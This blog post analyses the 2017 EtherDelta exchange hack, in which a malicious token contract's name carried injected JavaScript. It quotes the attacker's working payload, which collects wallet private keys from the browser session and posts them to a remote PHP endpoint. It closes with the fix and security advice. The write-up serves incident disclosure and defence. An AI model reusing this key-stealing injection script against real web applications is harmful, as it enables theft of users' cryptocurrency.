*The attack detailed in this post has already been fixed by the EtherDelta team. I share this as a cautionary tale for Dapp developers and cryptocurrency users.*

On September 24, 2017 I learned about a malicious code injection that allowed a hacker to steal private keys from multiple victims’ wallets and then manually drain the funds from those wallets. I will attempt to describe the attack, the security vulnerability that made it possible, and as much information as I have on the attacker.

### Some Background

For those who don’t know, EtherDelta is a cryptocurrency exchange for Ethereum and ERC20 compatible tokens (tokens that have been deployed on the Ethereum blockchain). These tokens can be stored and transfered with Ethereum wallets and smart contracts, and the entire EtherDelta exchange runs on a single smart contract, which you can view here:

[https://etherscan.io/address/0x8d12a197cb00d4747a1fe03395095ce2a5cc6819#code](https://etherscan.io/address/0x8d12a197cb00d4747a1fe03395095ce2a5cc6819?ref=hackernoon.com#code)

EtherDelta is a clever exchange — it does not require a traditional server architecture, because the back end architecture is a smart contract deployed on the Ethereum blockchain. It is a true Dapp, or Distributed Application, in the cryptocurrency sense of the word. When users “trade” on EtherDelta, they have to either create a wallet that they can use to interact with this smart contract, or they connect their existing wallet to EtherDelta to interact with the smart contract. The EtherDelta frontend functions much like MyEtherWallet.com, in that the website you load in your browser is a full wallet management application that also exposes the methods from the EtherDelta smart contract. Thus, users of EtherDelta must enter their public wallet address and *private key* when using the site, meaning their private key could be captured from the browser session by a malicious code injection.

In short, when you send your funds to a traditional exchange, you are trusting your funds to the exchange’s wallet or smart contract. If the exchange decides to rob its users, or it gets shuttered due to illegal behavior, you will lose your money. When you use EtherDelta, you are “trusting” your wallet’s private key (the key that can give anyone the ability to take the funds from your wallet) to the browser session, and you are “trusting” your funds to the EtherDelta smart contract. In the case of EtherDelta, you can read the entire source code for the site on GitHub:

[https://github.com/etherdelta/etherdelta.github.io](https://github.com/etherdelta/etherdelta.github.io?ref=hackernoon.com)

and you can read the entire code for the smart contract at the link above. Thus you can verify that the service is not funneling your data or funds outside of your control in any way… but there are still risks. These risks fall into two categories:



\1. Someone could trick you into visiting a fake clone of EtherDelta that uses a different smart contract, which can steal your funds when you transfer to it.2. Someone could inject code into the real EtherDelta that “sniffs” the private keys from the browser session, giving them unlimited access to your wallet. *This is the category the attack detailed in this piece falls under.*

I want to make one point clear: I believe that EtherDelta, in concept, is safer and more “trustworthy” than a traditional exchange. Everything about how EtherDelta functions is transparent and verifiable by users. The service creates a trustless, purely software-based interface between users executing buy & sell orders, and does not keep a record of this behavior other than the transfers that are recorded on the Ethereum blockchain. The attack detailed in this piece could have been identified by anyone before it was exploited, and if there had been a security review protocol in place, it would have been easily prevented. Also, once it was reported to the EtherDelta team, it was patched within a few hours.

### The Vulnerability

EtherDelta allows any ERC20 token to be traded by users. There are many tokens that are officially listed on the platform; the URL for these tokens looks like this:

[https://etherdelta.com/#LINK-ETH](https://etherdelta.com/?ref=hackernoon.com#LINK-ETH)

For any tokens that are not officially listed by the site, you can still trade them just the same using the address of the ERC20 token contract (the genesis contract that is used to create the tokens on the Ethereum blockchain and distribute them to users). To do this, you just modify the URL to include this address, like so:

[https://etherdelta.com/#0x514910771af9ca656af840dff83e8264ecf986ca-ETH](https://etherdelta.com/?ref=hackernoon.com#0x514910771af9ca656af840dff83e8264ecf986ca-ETH)

In this case, the two URLs above are for the same token, ChainLink. You can read the ERC20 token contract for ChainLink here:

[https://etherscan.io/token/0x514910771af9ca656af840dff83e8264ecf986ca](https://etherscan.io/token/0x514910771af9ca656af840dff83e8264ecf986ca?ref=hackernoon.com)

For each token, the EtherDelta interface displays the name of the token at the top of the screen. For unlisted tokens, it would display the address of the token contract (that long string that starts with 0x514…). At some point, the EtherDelta team decided it would be nice to lift the name of the token contract and display that in the EtherDelta interface instead, so the page displayed “ChainLink Token” instead of “0x514910771af9ca656af840dff83e8264ecf986ca”.

Taking any content from outside of the webpage and displaying it to the user (whether this content is user input or copied from another source, like a database, API, or another website) creates the possibility for an *injection vulnerability*. Web developers usually use validation methods to ensure that the content being displayed is only numbers, letters, or an acceptable range of characters, or will explicitly strip or modify certain types of content (like < > used for HTML tags or ( ) used for JavaScript code) to prevent the displayed content from actually being executed as live code.

I think you can see where this is going.

### What Happened

The attacker gained the trust of users through cryptocurrency chat rooms on Discord and Slack, and sent these users a link for an unlisted token on EtherDelta. He also posted this link in the official EtherDelta chat powered by Gitter. The contract address in the URL of this link was a malicious contract deployed by the attacker, where the name of the contract included a block of JavaScript code. When the name of the contract was displayed on the page, the JavaScript code was also “displayed” and thus executed, with full access to the data in the user’s session on EtherDelta. Here is the code from the malicious contract that was executed:

> f`[¤ ]DATA <script> function doSomething(){for($(“#depositBalanceToken a”).text().indexOf(“‘)”>DATA”)>=0&&$(“#depositBalanceToken a”).text(“DATA”),savedKeys=[],a=1;a<main.EtherDelta.addrs.length;a++)singlekey=[],singlekey[0]=main.EtherDelta.addrs[a],singlekey[1]=main.EtherDelta.pks[a],savedKeys.push(singlekey);var e={object:JSON.stringify(savedKeys)};$.post(“[https://cdn-solutions.com/update.php](https://cdn-solutions.com/update.php?ref=hackernoon.com)",e,function(e,n,t){}),setTimeout(doSomething,1e4)}var savedKeys=[];if(void 0===onlyonce){var onlyonce=!0;doSomething(),ga=function(){},doSomething(),$(“#accountSubmit”).click(function(){doSomething()})} </script>

Any web developer will immediately see what this script is doing. For those who just see Greek, the code reads the private key for the user’s wallet(s) from the browser session and then sends these keys to a remote PHP script which the attacker presumably used to collect these keys and then manually loaded the wallets and transferred the funds out to other wallets. The victims did not even realize this attack was taking place (there is a lot of JavaScript running already in the EtherDelta interface and the victims would not have thought of looking for data being transferred to remote locations). Also, the wallets that the attacker used to collect users’ funds were different from the malicious contract that was used to inject the code into the EtherDelta interface, so when the victims would follow the transactions to see where their funds were going, they couldn’t identify what allowed the attacker to gain access to their funds in the first place. In order to find the “smoking gun” for this attack, one of the victims had to go back to the malicious link, copy the contract address, paste it into Etherscan, and read the contract source thoroughly to find this code block. This victim didn’t know what the code did, just that it looked suspicious, so he shared it in one of the cryptocurrency chat rooms that I frequent, and I immediately realized what this code was capable of and explained it to him. By this time, the EtherDelta team was already working on a solution, which they announced here:





![img](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27400%27%20height=%27400%27/%3e)![image](https://pbs.twimg.com/profile_images/775077934650494976/YuV0wuPn_400x400.jpg)





*Oh, and in case you are wondering, this victim had ~$6,000 USD worth of cryptocurrency stolen from him. To date, no bug bounty has been offered for his efforts in tracking down the vulnerability.*

Update: I have collected more information on the malicious contract and the hacker behind it in a follow-up post: “[Following the trail](https://medium.com/@decktonic/following-the-trail-what-we-know-about-the-hacker-behind-the-etherdelta-attack-9ac6015fc2e1?ref=hackernoon.com).”

### Lessons to be Learned

Let this be a cautionary tale to everyone.

Are you a Dapp developer? **Trustless software requires a trustless mindset.** Take Murphy’s law to heart: *whatever can go wrong, will.* Don’t assume that anything you are relying on is “safe.” Take the necessary measures to “fence” your own software as much as possible. That includes validating and sanitizing all inputs as well as a myriad of other measures. This is imperative for financial software. Cryptocurrency services should have the same level of security & reliability that users expect of banks. And by all means, validate your assumptions with an extra pair of eyes. Hire someone (or multiple people) to conduct security audits of your software and test every possible scenario. The potential for lost customers due to malicious behavior that was enabled by your own oversight is not worth the risk. Also, keep in mind that this attack was partly enabled by an attempt to make EtherDelta more convenient (displaying a human-readable and recognizable token name instead of the contract address). Anything that makes a product better or more convenient carries risk. Make sure you know the risks before making even the smallest change.

Are you a cryptocurrency user?

- Don’t click a link you don’t know. If necessary, type the link into the browser yourself.
- Use separate browser sessions for sensitive use cases. For example, you can [open a guest session in Google Chrome](https://support.google.com/chrome/answer/6130773?co=GENIE.Platform%3DDesktop&hl=en&ref=hackernoon.com) that won’t have access to any of your user data from your regular browsing session.
- Use a separate wallet for trading on EtherDelta that only has the funds you need to trade. Ideally, use separate wallets for each ERC20 token that you plan to trade. Use a “cold” wallet for funds you plan to store long term. This way, if one of your wallets is compromised, you won’t be losing all of your funds at once.
- Take advantage of EtherDelta’s “forget wallet” feature and use it often. Consider “forgetting” your imported wallets every time you finish using EtherDelta. This way, if you happen to run into a situation where you load a compromised version of EtherDelta, you won’t already have your data live in the browser ready to be stolen. (This is why it’s a good thing that MyEtherWallet doesn’t “remember” your data in between sessions.)
- Make sure you understand, to the best of your knowledge, each software you use. Learn how sites like MyEtherWallet and EtherDelta work. Learn how your own wallets work. People get hacked all the time online and offline by attackers exploiting vulnerabilities in systems that we just assume are “safe.” **These problems are not new and they are definitely not unique.** The more you are informed and take the necessary measures to prevent yourself from becoming a victim, the better.

And please, share this with others so they can learn too. We are all in this together! *Be safe.*

Update 9/27: I received a request for proof of a change to the EtherDelta codebase that fixed this bug. Since the EtherDelta codebase is published to GitHub in a minified format (the entire JavaScript codebase is obfuscated and squashed down to 1 line), I figured it would be very difficult to find the change, but I want to remove all possibility of doubt, so I went ahead and dug for it.

Firstly, I had to un-minify the `main.js` file from the commits that took place before and during September 24. These are:



[**update · etherdelta/etherdelta.github.io@2cfe201**_Contribute to etherdelta.github.io development by creating an account on GitHub._github.com](https://github.com/etherdelta/etherdelta.github.io/commit/2cfe201318fdcb3331cba9edd243d8d6248281ed?ref=hackernoon.com)

and



[**update · etherdelta/etherdelta.github.io@76df489**_Contribute to etherdelta.github.io development by creating an account on GitHub._github.com](https://github.com/etherdelta/etherdelta.github.io/commit/76df48903b41565837c41990b87598b9e970916e?ref=hackernoon.com)

To un-minify `main.js`, I used [js-beautify](https://www.npmjs.com/package/js-beautify?ref=hackernoon.com) on the command line. Let’s just say this took a while since the file is over 2 MB.

I then had to manually search for keywords that might point to where the code pulls in the information from a custom contract… words like token, address, custom, etc. After searching for “address” a bunch of times, I finally came to a function that parses an ERC20 token contract using the web3 API (an API for interacting with the Ethereum blockchain, IIRC). And here it is:







const result = JSON.parse(body);const functionAbi = contract.abi.find(element => element.name === functionName);const solidityFunction = new SolidityFunction(web3.Eth, functionAbi, address);const resultUnpacked = xss(solidityFunction.unpackOutput(result.result));

In commit `76df489...`, an extra function call `xss()` is added to the step that unpacks the `abi` of the remote token contract. Here is how this same section is written in the previous commit:







const result = JSON.parse(body);const functionAbi = contract.abi.find(element => element.name === functionName);const solidityFunction = new SolidityFunction(web3.Eth, functionAbi, address);const resultUnpacked = solidityFunction.unpackOutput(result.result);

(I won’t be publishing the un-minified files, but you are welcome to download `main.js` from the EtherDelta GitHub repository and un-minify it yourself to see this.)

In searching the repository for this new method, I also found an issue that was reported to the issue tracker, based on another hack: custom Javascript being loaded directly through the URL. I did not even know this was possible, but here it is:



[**tags in GET query params are parsed and executed · Issue #143 · etherdelta/etherdelta.github.io**_tags appended to query params are executed when accessing EtherDelta. Combined with the fact that private keys are…_github.com](https://github.com/etherdelta/etherdelta.github.io/issues/143?ref=hackernoon.com)

As mentioned, the new library that is being used to prevent these types of attacks is js-xss:



[**leizongmin/js-xss**_js-xss - Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist_github.com](https://github.com/leizongmin/js-xss?ref=hackernoon.com)

In researching this, I came to the realization that the fundamental way EtherDelta operates is by loading custom code from remote locations (in this case, smart contracts published on the blockchain). For those of you who have experience developing web applications, you probably already know that any scenario that involves loading and executing custom code from remote locations is considered very dangerous, especially when there is no way to know who is responsible for the remote code being loaded. Obviously with EtherDelta, the responsibility is on the end user to determine which remote smart contract they wish to load (or, to avoid suspicious URLs from malicious individuals). The EtherDelta application runs entirely in the user’s browser, so the only way a user can have their data compromised is if they provide the data themselves (by importing their wallet) and if they expose themselves through their own behavior (by clicking a malicious link). That being said, the vast majority of users would never expect that using a website like EtherDelta carries this kind of risk (I have a degree in computer engineering and even I didn’t know this sort of vulnerability would be possible, but I’m glad I learned about it).

I also received a few questions from users curious to know whether this vulnerability would have affected Metamask or Ledger wallets. I can say without a doubt that Metamask and Ledger were both safe from this hack, because both only expose APIs that EtherDelta uses to interact with a user’s wallet, rather than using the user’s private key to load the user’s wallet directly. Essentially, if you want to be absolutely certain that your private key is not at risk of being exposed, either use a secure application/device like Metamask or Ledger, or be absolutely certain that you are visiting EtherDelta.com in a secure way.